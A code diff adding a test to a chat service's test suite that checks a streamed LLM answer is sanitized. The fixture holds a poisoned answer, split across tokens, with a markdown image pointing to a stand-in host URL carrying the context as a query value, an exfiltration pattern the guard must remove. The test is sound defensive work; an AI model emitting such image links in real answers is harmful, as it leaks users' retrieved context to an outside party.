@@ -203,3 +203,18 @@ async def test_llm_failure_yields_error_event():
     error = events[-1]
     assert isinstance(error, ChatError)
     assert "generation failed" in error.message
+
+
+async def test_answer_is_sanitized_before_streaming():
+    # A poisoned answer split across tokens must not reach the client intact.
+    llm = FakeLLM(["Fix it [1]. ![s](https://untr", "usted.test/c?d=ctx)\nDone."])
+    service = ChatService(FakeRetriever(), llm, context_k=2)
+    events = await collect(service)
+
+    text = "".join(e.text for e in events if isinstance(e, ChatDelta))
+    assert "untrusted.test" not in text
+    assert text == "Fix it [1]. [image removed: s]\nDone."
+    done = events[-1]
+    assert isinstance(done, ChatDone)
+    assert done.output_guard == {"image_removed": 1}
+    assert done.cited == [1]
